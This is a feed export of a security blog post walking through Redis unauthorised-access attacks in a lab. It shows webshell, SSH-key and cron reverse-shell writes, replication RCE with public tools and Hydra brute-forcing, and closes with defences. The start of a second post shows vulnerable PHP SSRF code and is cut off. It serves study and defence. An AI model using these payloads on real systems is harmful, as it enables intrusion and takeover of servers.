    <content type="html"><![CDATA[<h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><p>Redis服务的默认端口是6379。</p><p>官网查看更多信息：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p><ul><li>查看信息：info</li><li>删除所有数据库内容：flushall</li><li>刷新数据库：flushdb</li><li>查看所有键：keys *，使用select num可以查看键值数据</li><li>设置变量：set aaa “mi1k7ea”</li><li>查看变量值：get aaa</li><li>查看备份文件路径：config get dir</li><li>设置备份文件路径：config set dir dirpath</li><li>查看备份文件名：config get dbfilename</li><li>设置备份文件名：config set dbfilename filename</li><li>保存备份文件：save</li></ul><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并解压运行make</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line">tar zxf redis-3.2.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将redis.conf复制到/etc/目录下</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/中的redis配置文件redis.conf</span></span><br><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="comment">#注释掉本地绑定，允许除本地外的主机远程访问Redis服务</span></span><br><span class="line"><span class="comment">##bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#关闭保护模式，允许远程连接Redis服务</span></span><br><span class="line"><span class="comment">#protected-mode no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.137 -p 6379</span><br></pre></td></tr></table></figure><h3 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h3><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure><p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p><p>你可以通过以下命令来修改该参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;runoob&quot;</span><br></pre></td></tr></table></figure><p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p><p>密码验证用到AUTH命令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure><h2 id="0x02-Redis漏洞攻击利用"><a href="#0x02-Redis漏洞攻击利用" class="headerlink" title="0x02 Redis漏洞攻击利用"></a>0x02 Redis漏洞攻击利用</h2><p>Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。</p><p>在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的<code>bind 127.0.0.1</code>。</p><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p><p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p><h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p><p><img src="/2020/03/05/Redis安全小结/1.png" alt=""></p><p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p><p><img src="/2020/03/05/Redis安全小结/2.png" alt=""></p><p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用：</p><p><img src="/2020/03/05/Redis安全小结/3.png" alt=""></p><h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p><p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p><p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/4.png" alt=""></p><p>在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007�redis-ver3.2.11�</span><br><span class="line">redis-bits�@�ctime� c^used-mem�h�</span><br><span class="line">                                  ��payload&lt;?php @eval($_POST[c]);?&gt;�hUuϞ^</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/5.png" alt=""></p><p>由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p><p><img src="/2020/03/05/Redis安全小结/6.png" alt=""></p><h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p><p>原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。</p><p>先在Ubuntu中生成公私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/7.png" alt=""></p><p>获取公钥内容<code>cat /home/ski12/.ssh/id_rsa.pub</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/8.png" alt=""></p><p>通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/9.png" alt=""></p><p>为了不用自己复制粘贴公钥内容，换种形式也OK：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; m7.txt</span><br><span class="line">cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure><p>此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的：</p><p><img src="/2020/03/05/Redis安全小结/10.png" alt=""></p><p>注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure><p>接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.137</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/11.png" alt=""></p><h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p><ul><li>权限问题，Ubuntu定时任务需要root权限；</li><li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li></ul><p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/13.png" alt=""></p><p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p><p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p><p><img src="/2020/03/05/Redis安全小结/12.png" alt=""></p><p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/14.png" alt=""></p><p>具体CentOS的利用可自行测试。</p><p>不同OS的系统任务调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure><blockquote><p>可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul></blockquote><h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p><p>写入/etc/passwd文件实现任意账号密码重置：<a href="https://www.freebuf.com/vuls/148758.html#-etcpasswd" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148758.html#-etcpasswd</a></p><p>写入Windows启动项：<a href="https://www.anquanke.com/post/id/170360#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-3</a></p><p>写入Windows MOF：<a href="https://www.anquanke.com/post/id/170360#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-4</a></p><h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p><p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p><p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p><p>Redis主从数据库之间的同步分为两种：</p><ul><li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li><li>部分复制只是将写命令发送给从机；</li></ul><p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p><p>这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure><p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p><p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p><p>然后在攻击者机器上执行如下命令即可成功RCE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/15.png" alt=""></p><h3 id="用Hydra暴力破解Redis密码"><a href="#用Hydra暴力破解Redis密码" class="headerlink" title="用Hydra暴力破解Redis密码"></a>用Hydra暴力破解Redis密码</h3><p>使用Hydra工具可以对Redis密码进行暴力破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137</span><br></pre></td></tr></table></figure><h3 id="历史CVE漏洞"><a href="#历史CVE漏洞" class="headerlink" title="历史CVE漏洞"></a>历史CVE漏洞</h3><h4 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h4><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p><h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><p>读取”.rediscli_history”配置文件信息。</p><h3 id="不存在NoSQL注入问题？"><a href="#不存在NoSQL注入问题？" class="headerlink" title="不存在NoSQL注入问题？"></a>不存在NoSQL注入问题？</h3><p>目前来说是的。</p><p>Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。</p><p>以下是RESP协议的通用形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;number of arguments&gt; CR LF</span><br><span class="line">$&lt;number of bytes of argument 1&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;number of bytes of argument N&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br></pre></td></tr></table></figure><p>例子如下，原本命令为<code>SET mykey myvalue</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$5</span><br><span class="line">mykey</span><br><span class="line">$7</span><br><span class="line">myvalue</span><br></pre></td></tr></table></figure><p>Redis客户端格式化后的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n&quot;</span><br></pre></td></tr></table></figure><p>Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。</p><p>Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p><p>Redis协议规范可参考：<a href="http://www.redis.cn/topics/protocol.html" target="_blank" rel="noopener">http://www.redis.cn/topics/protocol.html</a></p><p>Redis通信过程分析可参考：<a href="https://draveness.me/redis-cli" target="_blank" rel="noopener">https://draveness.me/redis-cli</a></p><h2 id="0x03-漏洞组合拳"><a href="#0x03-漏洞组合拳" class="headerlink" title="0x03 漏洞组合拳"></a>0x03 漏洞组合拳</h2><p>一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。</p><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p><p>具体可参考：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p><h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p><p>原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p><p>具体可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>禁止公网开放Redis服务，可以在防火墙上禁用6379端口；</li><li>修改Redis服务端口为其他非常见的端口号；</li><li>配置Redis的密码访问验证；</li><li>禁用不使用的高危命令；</li><li>重命名高危命令的名称；</li><li>以低权限运行Redis服务，禁止用root等最高权限运行；</li><li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></p><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/75627194" target="_blank" rel="noopener">redis未授权访问漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.mi1k7ea.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks小结/</id>
    <published>2020-02-29T15:53:30.000Z</published>
    <updated>2020-03-08T09:08:08.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p><h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>其中有如下几个注意点：</p><ul><li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li><li>file_get_contents()的Gopher协议不能进行URLencode；</li><li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li><li>file_get_contents()支持php://input协议；</li><li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li><li>curl_exec()默认不跟踪跳转；</li></ul><p>curl_exec()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><p>file_get_contents()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure><p>fsockopen()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span 